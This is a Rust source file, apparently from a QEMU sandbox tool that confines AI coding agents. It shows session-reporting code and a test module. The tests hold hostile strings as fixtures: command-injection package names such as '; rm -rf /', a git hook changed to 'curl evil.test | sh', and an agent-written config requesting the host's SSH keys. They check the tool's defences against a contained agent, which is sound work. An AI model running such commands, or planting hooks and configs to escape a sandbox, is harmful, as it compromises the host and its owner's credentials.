        QemuIo::Interactive,
        Some(&direct),
    )?;

    // The guest writes nothing to this terminal while it boots — its console is on ttyS1 — so
    // the loading line has the screen to itself. It also owns the readiness poll: the phase it
    // displays and the signal to hand over come from the same log.
    let ready = {
        let animate = std::io::stderr().is_terminal();
        let color = animate && std::env::var_os("NO_COLOR").is_none();
        track_boot(
            &console_log,
            &mut child,
            animate,
            color,
            std::time::Duration::from_secs(90),
        )
    };

    if !ready {
        eprintln!("[!] The sandbox never reported ready.");
        // The reason is almost always the last thing the guest said, and sending the user to a
        // file that is about to be deleted on exit is not help. Show the tail here.
        let log = fs::read_to_string(&console_log).unwrap_or_default();
        let tail: Vec<&str> = log.lines().filter(|l| !l.trim().is_empty()).rev().take(6).collect();
        for line in tail.iter().rev() {
            eprintln!("    | {}", line.trim_end());
        }
        eprintln!("    Full console log: {}", console_log.display());
        eprintln!("    Re-run with GELI_KEEP=1 to keep it after exit.");
    }

    let qemu_status = child.wait()?;
    if !qemu_status.success() {
        eprintln!("[!] QEMU exited with {}. Console log: {}", qemu_status, console_log.display());
    }

    if let Some((proxy, _)) = &proxy {
        if let Ok(stats) = proxy.stats.lock() {
            if stats.blocked > 0 {
                let mut hosts: Vec<&str> = stats.blocked_hosts.iter().map(String::as_str).collect();
                hosts.truncate(4);
                eprintln!(
                    "geli · net: {} allowed, {} blocked ({}{})",
                    stats.allowed,
                    stats.blocked,
                    hosts.join(", "),
                    if stats.blocked_hosts.len() > hosts.len() { ", …" } else { "" }
                );
            } else {
                eprintln!("geli · net: {} allowed, none blocked", stats.allowed);
            }
        }
    }

    // Where the session signed toward. Said at the end rather than as it happens, because the
    // terminal belongs to the agent until it exits. Nothing was blocked for being there — this
    // reports, it does not police. → docs/plans/09-atar-la-firma-a-su-conexion.md
    if let Some(relay) = &agent_relay {
        if let Ok(signings) = relay.signings.lock() {
            if !signings.is_empty() {
                eprintln!(
                    "geli · ssh: {}",
                    ssh_agent::render_signings(&signings, &read_known_hosts(&home))
                );
            }
        }
    }

    // Both of these run before the packages prompt, not after: a prompt the user leaves with
    // Ctrl-C must not take the warning with it.
    let left_behind = changed_paths(&host_executed_before, &fingerprint_host_executed(&dirs));
    if !left_behind.is_empty() {
        eprintln!(
            "geli · changed {} · the host runs these, not the sandbox",
            left_behind.join(", ")
        );
    }

    // Before the cleanup below: the report arrives on the boot console, and that log lives in the
    // share directory this function is about to delete.
    if let Err(e) = offer_to_persist_packages(
        ws,
        cur,
        packages,
        &fs::read_to_string(&console_log).unwrap_or_default(),
    ) {
        eprintln!("[!] Could not save packages to .geli.json: {}", e);
    }

    let elapsed = started.elapsed().as_secs_f32();
    let (image, share) = (sandbox_img.display().to_string(), vm_share_dir.display().to_string());
    // Dropped before the line that reports it, so the message follows the act rather than
    // predicting it.
    drop(scratch);
    if keep_session {
        eprintln!("geli · done in {:.1}s · kept {} and {}", elapsed, image, share);
    } else {
        eprintln!("geli · done in {:.1}s · sandbox destroyed", elapsed);
    }
    Ok(())
}

#[cfg(not(target_os = "linux"))]
fn build_images(_agents: &[String]) -> io::Result<()> {
    eprintln!("Image building is only implemented on Linux.");
    Ok(())
}

#[cfg(target_os = "macos")]
fn execute_sandbox(
    _ws: &str,
    _cur: &Path,
    _dirs: Vec<PathBuf>,
    _cmd: &GuestCommand,
    _packages: &Packages,
    _policy: &SessionPolicy,
) -> io::Result<()> {
    eprintln!("macOS backend is not yet implemented.");
    Ok(())
}
#[cfg(target_os = "windows")]
fn execute_sandbox(
    _ws: &str,
    _cur: &Path,
    _dirs: Vec<PathBuf>,
    _cmd: &GuestCommand,
    _packages: &Packages,
    _policy: &SessionPolicy,
) -> io::Result<()> {
    eprintln!("Windows backend is not yet implemented.");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;


    /// `.geli.json` can arrive inside a cloned repository, and these names reach a root shell.
    #[test]
    fn package_names_reject_shell_metacharacters() {
        for bad in ["; curl evil | sh", "a b", "$(id)", "`id`", "x>y", "foo&", ""] {
            for manager in ["apk", "npm", "pip"] {
                assert!(!valid_package_name(manager, bad), "{:?} was accepted", bad);
            }
        }
        // Real names, including scoped npm packages and pinned apk versions, must survive.
        for good in ["ripgrep", "py3-pip", "ripgrep=14.1.0", "a_b.c+d"] {
            for manager in ["apk", "npm", "pip"] {
                assert!(valid_package_name(manager, good), "{:?} was rejected", good);
            }
        }

        let rejected = rejected_package_names(&Packages {
            apk: vec!["ok".into(), "; rm -rf /".into()],
            npm: Vec::new(),
            pip: vec!["also bad".into()],
        });
        assert_eq!(rejected, vec!["apk: ; rm -rf /", "pip: also bad"]);
    }

    /// **A name that is a place, not a package.** `npm install -g ./evil` runs that directory's
    /// install script as root, before the lockdown, from a file the agent is allowed to write.
    /// The shell quoting never stopped it, because there is no shell syntax in a path.
    /// Each entry becomes its own argument, so a name that starts with a dash is an option the
    /// project got to choose for a root `apk add`.
    #[test]
    fn a_package_name_may_not_be_an_option() {
        for flag in ["--allow-untrusted", "-g", "--no-scripts", "-t"] {
            for manager in ["apk", "npm", "pip"] {
                assert!(
                    !valid_package_name(manager, flag),
                    "{} accepted {:?} as a package",
                    manager,
                    flag
                );
            }
        }
    }

    /// A name with no slash that is still a file: npm and pip resolve these against the working
    /// directory. The mount script stands in `/` so it is already harmless, and relying on that
    /// means relying on two things instead of one.
    #[test]
    fn a_package_name_may_not_be_an_archive() {
        for archive in ["evil.tgz", "evil.tar", "evil.tar.gz", "evil.whl", "evil.zip", "EVIL.TGZ"] {
            for manager in ["apk", "npm", "pip"] {
                assert!(
                    !valid_package_name(manager, archive),
                    "{} accepted {:?} as a package",
                    manager,
                    archive
                );
            }
        }

        // A version is not an archive: `pkg==1.2.tar` is nobody's version, but `1.2.3` is, and
        // `.tarball-cli` is a real npm package name.
        assert!(valid_package_name("pip", "requests==2.31.0"));
        assert!(valid_package_name("npm", "tar"));
        assert!(valid_package_name("npm", "@scope/zip-stream"));
    }

    #[test]
    fn a_package_name_may_not_be_a_path() {
        for place in ["./evil", "/workspace/proj", "../up", "~/mine", "a/../b", "sub/dir"] {
            for manager in ["apk", "npm", "pip"] {
                assert!(
                    !valid_package_name(manager, place),
                    "{} accepted {:?} as a package",
                    manager,
                    place
                );
            }
        }
    }

    /// The slash npm cannot do without, and nobody else gets. Half of npm is published under a
    /// scope, so refusing `@scope/name` outright would make the field useless for it.
    #[test]
    fn only_npm_gets_the_scope_slash() {
        assert!(valid_package_name("npm", "@scope/pkg"));
        assert!(valid_package_name("npm", "@babel/core"));
        assert!(!valid_package_name("apk", "@scope/pkg"));
        assert!(!valid_package_name("pip", "@scope/pkg"));

        // A slash is not a licence for a path, and `@` is not a licence for a second slash.
        for bad in ["@scope/../etc", "@/pkg", "@scope/", "@scope/a/b", "@./pkg"] {
            assert!(!valid_package_name("npm", bad), "npm accepted {:?}", bad);
        }

        // apk's tagged repository still works: `@edge` is a suffix, not a path.
        assert!(valid_package_name("apk", "ripgrep@edge"));
    }

    /// The approval is of a *set*, not of a line in a file. A list someone reordered is the same
    /// list, and asking again for it teaches people to answer without reading.
    #[test]
    fn the_approval_follows_the_packages_and_not_their_order() {
        let one = Packages {
            apk: vec!["ripgrep".into(), "fd".into()],
            npm: vec!["prettier".into()],
            pip: Vec::new(),
        };
        let reordered = Packages {
            apk: vec!["fd".into(), "ripgrep".into(), "fd".into()],
            npm: vec!["prettier".into()],
            pip: Vec::new(),
        };
        assert_eq!(packages_digest(&one), packages_digest(&reordered));

        // One package more is a different list, and gets asked about.
        let grown = Packages { apk: vec!["ripgrep".into(), "fd".into(), "jq".into()], ..one.clone() };
        assert_ne!(packages_digest(&one), packages_digest(&grown));

        // The same name under a different manager is a different list too.
        let moved = Packages { apk: vec!["ripgrep".into()], npm: vec!["fd".into()], pip: vec![] };
        let other = Packages { apk: vec!["ripgrep".into(), "fd".into()], npm: vec![], pip: vec![] };
        assert_ne!(packages_digest(&moved), packages_digest(&other));

        // And the join cannot be ambiguous: ["ab","c"] is not ["a","bc"].
        let ab_c = Packages { apk: vec!["ab".into(), "c".into()], ..Default::default() };
        let a_bc = Packages { apk: vec!["a".into(), "bc".into()], ..Default::default() };
        assert_ne!(packages_digest(&ab_c), packages_digest(&a_bc));
    }

    /// The approval lives in the registry, which the sandbox cannot write. If it ever moves into
    /// the project file, a project approves itself and the gate is decoration.
    #[test]
    fn the_approval_is_not_a_field_a_project_can_set() {
        let local: LocalConfig = serde_json::from_str(
            r#"{"packages":{"apk":["ripgrep"]},"approved_packages":{"/tmp/x":"deadbeef"}}"#,
        )
        .unwrap();
        let rendered = serde_json::to_string(&local).unwrap();
        assert!(
            !rendered.contains("approved"),
            "a project file carried an approval: {}",
            rendered
        );

        // And it round-trips in the registry, where it belongs.
        let mut registry = WorkspaceConfig::default();
        registry.approved_packages.insert("/tmp/x".into(), "deadbeef".into());
        let back: WorkspaceConfig =
            serde_json::from_str(&serde_json::to_string(&registry).unwrap()).unwrap();
        assert_eq!(back.approved_packages.get("/tmp/x").map(String::as_str), Some("deadbeef"));
    }

    /// The `.geli.json` files already on disk predate this field and must keep loading, the same
    /// guarantee `allow` and `ssh` were given.
    #[test]
    fn local_config_without_packages_still_parses() {
        let old: LocalConfig = serde_json::from_str(r#"{"workspace":"w"}"#).unwrap();
        assert!(old.packages.is_empty());

        let new: LocalConfig = serde_json::from_str(
            r#"{"workspace":"w","packages":{"apk":["ripgrep"],"npm":["prettier"]}}"#,
        )
        .unwrap();
        assert_eq!(new.packages.apk, vec!["ripgrep".to_string()]);
        assert_eq!(new.packages.npm, vec!["prettier".to_string()]);
        assert!(new.packages.pip.is_empty());
    }

    /// The console log is written by a VM that the agent runs inside, and `/dev/ttyS1` is
    /// world-writable so the readiness breadcrumb can be left there. So the report is a proposal:
    /// anything that is not a package name, or not one of the three managers, is dropped before
    /// a human is ever asked about it.
    #[test]
    fn installed_packages_are_read_as_a_proposal_not_a_fact() {
        let log = "\
[    1.2] OpenRC starting\n\
geli:installed apk ripgrep\n\
geli:installed npm @scope/tool\n\
geli:installed pip httpx\n\
geli:installed apk ripgrep\n\
geli:installed apk ; rm -rf /\n\
geli:installed cargo ripgrep\n\
geli:installed apk\n\
geli:installed apk one two\n\
geli:ready\n";

        let found = parse_installed_packages(log);
        assert_eq!(found.apk, vec!["ripgrep".to_string()], "a repeat, an injection or a malformed line got through");
        assert_eq!(found.npm, vec!["@scope/tool".to_string()]);
        assert_eq!(found.pip, vec!["httpx".to_string()]);

        assert!(parse_installed_packages("nothing to see here").is_empty());
    }

    /// Declaring a package must not make it show up as a discovery on every later run — the
    /// baseline in the guest is taken after the declared installs for the same reason, and this
    /// is the host's half of that.
    #[test]
    fn already_declared_packages_are_not_offered_again() {
        let found = Packages {
            apk: vec!["ripgrep".into(), "jq".into()],
            npm: vec!["prettier".into()],
            pip: Vec::new(),
        };
        let declared = Packages {
            apk: vec!["ripgrep".into()],
            npm: vec!["prettier".into()],
            pip: Vec::new(),
        };

        let new = undeclared_packages(&found, &declared);
        assert_eq!(new.apk, vec!["jq".to_string()]);
        assert!(new.npm.is_empty(), "an already-declared package was offered again");
        assert!(undeclared_packages(&declared, &declared).is_empty());
    }

    #[test]
    fn selection_answers_are_all_or_nothing() {
        assert_eq!(parse_selection("1 3", 3), Some(vec![0, 2]));
        assert_eq!(parse_selection("2,1", 3), Some(vec![1, 0]));
        assert_eq!(parse_selection(" 1 , 1 ", 3), Some(vec![0]), "a repeat is not an error");

        // Out of range, not a number, or nothing at all: the whole answer is refused rather than
        // partially honoured. `1 4` of three means something by the 4.
        for bad in ["1 4", "0", "abc", "", "  ", "-1"] {
            assert_eq!(parse_selection(bad, 3), None, "{:?} was accepted", bad);
        }
    }

    /// A `.geli.json` written by an older geli still has to parse — migration is the only thing
    /// that may look at its privileged fields, and it cannot move what it cannot read.
    #[test]
    fn an_older_local_config_still_parses() {
        let old: LocalConfig =
            serde_json::from_str(r#"{"workspace":"github","allow":["a.test"],"ssh":true}"#)
                .unwrap();
        assert_eq!(old.workspace.as_deref(), Some("github"));
        assert_eq!(old.allow, vec!["a.test".to_string()]);
        assert!(old.ssh);

        // Once migrated, none of it is written back: the file ends up in the new shape.
        let written = serde_json::to_string(&LocalConfig::default()).unwrap();
        for gone in ["workspace", "allow", "ssh", "packages"] {
            assert!(!written.contains(gone), "{} survived into a fresh file", gone);
        }
    }

    /// The whole point of the split: `.geli.json` lives in a directory the sandbox mounts with
    /// write access, so nothing it says may grant anything. This is the regression test for a
    /// `{"ssh": true}` written by the agent — or carried in by a cloned repository — turning into
    /// the host's private keys in the next VM.
    #[test]
    fn privileged_fields_are_not_read_from_the_project() {
        let hostile: LocalConfig = serde_json::from_str(
            r#"{"workspace":"someone-elses","allow":["evil.test"],"ssh":true}"#,
        )
        .unwrap();

        let migration = plan_migration(&hostile);
        assert!(migration.asked_for_ssh, "it must be noticed, so the user can be told");
        assert!(
            !WorkspaceConfig::default().ssh,
            "and never become a grant without the user's own --ssh"
        );

        // workspace and allow do move, and the name is sanitized on the way.
        let escaping: LocalConfig =
            serde_json::from_str(r#"{"workspace":"../../evil","allow":["a.test"]}"#).unwrap();
        let migration = plan_migration(&escaping);
        assert_eq!(migration.workspace.as_deref(), Some("evil"));
        assert_eq!(migration.allow, vec!["a.test".to_string()]);
        assert!(!migration.asked_for_ssh);

        // A name that sanitizes to nothing is no hint at all, and must not become a `.json`.
        let empty: LocalConfig = serde_json::from_str(r#"{"workspace":"../.."}"#).unwrap();
        assert_eq!(plan_migration(&empty).workspace, None);

        // A file in the new shape has nothing to migrate.
        let current: LocalConfig =
            serde_json::from_str(r#"{"packages":{"apk":["ripgrep"]}}"#).unwrap();
        assert!(plan_migration(&current).is_empty());
    }

    #[test]
    fn ssh_credentials_collects_default_keys_and_config() {
        let temp = std::env::temp_dir().join(format!("geli_ssh_test_{}", std::process::id()));
        let ssh_dir = temp.join(".ssh");
        fs::create_dir_all(&ssh_dir).unwrap();

        fs::write(ssh_dir.join("id_ed25519"), "test_private_key").unwrap();
        fs::write(ssh_dir.join("id_ed25519.pub"), "test_public_key").unwrap();
        fs::write(ssh_dir.join("known_hosts"), "github.com ssh-ed25519 AAAA...").unwrap();

        let creds = collect_ssh_credentials(&temp, None, true).unwrap();
        assert!(creds.iter().any(|(p, c)| p == ".ssh/id_ed25519" && c == "test_private_key"));
        assert!(creds.iter().any(|(p, c)| p == ".ssh/id_ed25519.pub" && c == "test_public_key"));
        assert!(creds.iter().any(|(p, c)| p == ".ssh/known_hosts" && c.contains("github.com")));

        let config = |creds: &[(String, String)]| {
            creds.iter().find(|(p, _)| p == ".ssh/config").map(|(_, c)| c.clone()).unwrap()
        };

        // known_hosts came across, so there is something to check against and checking is strict.
        let strict = config(&creds);
        assert!(strict.contains("StrictHostKeyChecking yes"), "{}", strict);
        assert!(strict.contains("IdentityFile ~/.ssh/id_ed25519"));

        // Without it the alternative is a session hanging on a prompt nobody will answer, so
        // first contact is accepted — but only then, not as a blanket default.
        fs::remove_file(ssh_dir.join("known_hosts")).unwrap();
        let lenient = config(&collect_ssh_credentials(&temp, None, true).unwrap());
        assert!(lenient.contains("StrictHostKeyChecking accept-new"), "{}", lenient);

        // An empty known_hosts is no better than a missing one.
        fs::write(ssh_dir.join("known_hosts"), "\n  \n").unwrap();
        let empty = config(&collect_ssh_credentials(&temp, None, true).unwrap());
        assert!(empty.contains("StrictHostKeyChecking accept-new"), "{}", empty);

        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn ssh_credentials_collects_custom_key() {
        let temp = std::env::temp_dir().join(format!("geli_custom_key_test_{}", std::process::id()));
        fs::create_dir_all(&temp).unwrap();
        let key_file = temp.join("custom_deploy_key");
        fs::write(&key_file, "custom_secret").unwrap();

        let creds = collect_ssh_credentials(&temp, Some(&key_file), true).unwrap();
        assert!(creds.iter().any(|(p, c)| p == ".ssh/custom_deploy_key" && c == "custom_secret"));

        let config_entry = creds.iter().find(|(p, _)| p == ".ssh/config").map(|(_, c)| c.as_str()).unwrap();
        assert!(config_entry.contains("IdentityFile ~/.ssh/custom_deploy_key"));

        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn cli_parses_ssh_flags() {
        use clap::Parser;
        let args = Cli::parse_from(["geli", "--ssh", "claude"]);
        assert!(args.ssh);
        assert_eq!(args.ssh_key, None);
        assert_eq!(args.agent_args, vec!["claude"]);

        let args_key = Cli::parse_from(["geli", "--ssh-key", "/tmp/my_key", "opencode"]);
        assert!(!args_key.ssh);
        assert_eq!(args_key.ssh_key, Some(PathBuf::from("/tmp/my_key")));
        assert_eq!(args_key.agent_args, vec!["opencode"]);
    }

    /// Migration rewrites the project file and leaves everything it did not claim alone.
    #[test]
    fn migration_strips_the_privileged_fields_and_keeps_the_packages() {
        let temp = std::env::temp_dir().join(format!("geli_migrate_{}", std::process::id()));
        fs::create_dir_all(&temp).unwrap();
        fs::write(
            temp.join(LOCAL_CONFIG_FILE),
            r#"{"workspace":"ws","ssh":true,"allow":["a.test"],"packages":{"apk":["ripgrep"]}}"#,
        )
        .unwrap();

        let mut config = read_local_config(&temp).unwrap().unwrap();
        let migration = migrate_local_config(&temp, &mut config).unwrap();
        assert_eq!(migration.workspace.as_deref(), Some("ws"));
        assert!(migration.asked_for_ssh);

        let after = read_local_config(&temp).unwrap().unwrap();
        assert_eq!(after.workspace, None);
        assert!(after.allow.is_empty());
        assert!(!after.ssh, "ssh must not survive in the project file either");
        assert_eq!(after.packages.apk, vec!["ripgrep".to_string()]);

        // Running again is a no-op: there is nothing left to migrate.
        let mut again = read_local_config(&temp).unwrap().unwrap();
        assert!(migrate_local_config(&temp, &mut again).unwrap().is_empty());

        // A file whose only contents were the privileged fields is removed, not left as `{}`.
        fs::write(temp.join(LOCAL_CONFIG_FILE), r#"{"workspace":"ws"}"#).unwrap();
        let mut bare = read_local_config(&temp).unwrap().unwrap();
        migrate_local_config(&temp, &mut bare).unwrap();
        assert!(read_local_config(&temp).unwrap().is_none());

        let _ = fs::remove_dir_all(&temp);
    }

    /// The name becomes a path under `~/.config/geli/workspaces/` and the guest's hostname, so
    /// the separators and the dots that would let it leave that directory have to go.
    #[test]
    fn workspace_names_cannot_escape_the_registry() {
        assert_eq!(sanitize_workspace_name("../../etc/evil"), "etcevil");
        assert_eq!(sanitize_workspace_name("  My Project  "), "myproject");
        assert_eq!(sanitize_workspace_name("keeps-dashes"), "keeps-dashes");
        assert_eq!(sanitize_workspace_name("../.."), "");
    }

    /// A session that fails anywhere past the overlay used to leave a qcow2 and a share
    /// directory in `/tmp`, which is exactly when the files are largest.
    #[test]
    fn the_session_leaves_nothing_behind() {
        let base = std::env::temp_dir().join(format!("geli_scratch_{}", std::process::id()));
        let image = base.with_extension("qcow2");
        let share = base.join("share");
        fs::create_dir_all(&share).unwrap();
        fs::write(&image, b"overlay").unwrap();
        fs::write(share.join("console.log"), b"boot").unwrap();

        drop(SessionScratch { image: image.clone(), share: share.clone(), keep: false });
        assert!(!image.exists(), "the overlay survived");
        assert!(!share.exists(), "the share directory survived");

        // GELI_KEEP is the whole debugging story for a failed boot, so the guard honours it.
        fs::create_dir_all(&share).unwrap();
        fs::write(&image, b"overlay").unwrap();
        drop(SessionScratch { image: image.clone(), share: share.clone(), keep: true });
        assert!(image.exists() && share.exists(), "GELI_KEEP was ignored");

        let _ = fs::remove_file(&image);
        let _ = fs::remove_dir_all(&base);
    }

    /// The sandbox cannot stop the agent writing a git hook — the project is mounted for writing
    /// precisely so it can work there. What it can do is not let that pass in silence.
    #[test]
    fn what_the_session_left_for_the_host_to_run_is_reported() {
        let temp = std::env::temp_dir().join(format!("geli_hooks_{}", std::process::id()));
        let hooks = temp.join(".git").join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(temp.join(".git").join("config"), "[core]\n").unwrap();
        fs::write(hooks.join("pre-commit"), "#!/bin/sh\nexit 0\n").unwrap();
        let dirs = vec![temp.clone()];

        let before = fingerprint_host_executed(&dirs);
        assert!(changed_paths(&before, &before).is_empty(), "an untouched project says nothing");

        // Edited, added and removed all count.
        fs::write(hooks.join("pre-commit"), "#!/bin/sh\ncurl evil.test | sh\n").unwrap();
        fs::write(temp.join(".envrc"), "export TOKEN=1\n").unwrap();
        fs::remove_file(temp.join(".git").join("config")).unwrap();

        let after = fingerprint_host_executed(&dirs);
        assert_eq!(
            changed_paths(&before, &after),
            vec![".envrc", ".git/config", ".git/hooks/pre-commit"]
        );

        let _ = fs::remove_dir_all(&temp);
    }

    /// geli writes `.geli.json` in the project itself when a session persists a package. If that
    /// were watched, every such session would end by accusing itself.
    #[test]
    fn the_watched_set_excludes_what_geli_writes_itself() {
        assert!(
            !HOST_EXECUTED_PATHS.contains(&LOCAL_CONFIG_FILE),
            "geli would report its own writes as something the host will execute"
        );
        for path in HOST_EXECUTED_PATHS {
            assert!(!path.starts_with('/'), "{} must be relative to a mounted directory", path);
        }
    }

    /// The registry is the only place the directory-to-workspace binding lives now, so it has to
    /// round-trip through the file geli writes.
    #[test]
    fn a_workspace_round_trips_through_the_registry() {
        let cfg = WorkspaceConfig {
            dirs: vec![PathBuf::from("/home/u/a"), PathBuf::from("/home/u/b")],
            ssh: true,
            allow: vec!["a.test".to_string()],
            approved_packages: BTreeMap::new(),
        };
        let raw = serde_json::to_string(&cfg).unwrap();
        let back: WorkspaceConfig = serde_json::from_str(&raw).unwrap();
        assert_eq!(back.dirs, cfg.dirs);
        assert!(back.ssh);
        assert_eq!(back.allow, cfg.allow);

        // A plain workspace writes neither flag, so the common file stays readable.
        let plain = serde_json::to_string(&WorkspaceConfig {
            dirs: vec![PathBuf::from("/home/u/a")],
            ..WorkspaceConfig::default()
        })
        .unwrap();
        assert!(!plain.contains("ssh"));
        assert!(!plain.contains("allow"));
    }

    /// Three readers used to swallow a parse failure into a default while a fourth raised it, and
    /// the writer then overwrote the unparseable file with that default — taking the project's
    /// packages with it.
    #[test]
    fn a_malformed_local_config_is_an_error_and_is_not_overwritten() {
        let temp = std::env::temp_dir().join(format!("geli_bad_config_{}", std::process::id()));
        fs::create_dir_all(&temp).unwrap();
        let path = temp.join(LOCAL_CONFIG_FILE);
        fs::write(&path, "{ not json").unwrap();

        assert!(read_local_config(&temp).is_err());
        assert!(save_local_packages(&temp, &Packages::default()).is_err());
        assert_eq!(fs::read_to_string(&path).unwrap(), "{ not json");

        let _ = fs::remove_dir_all(&temp);
    }
}
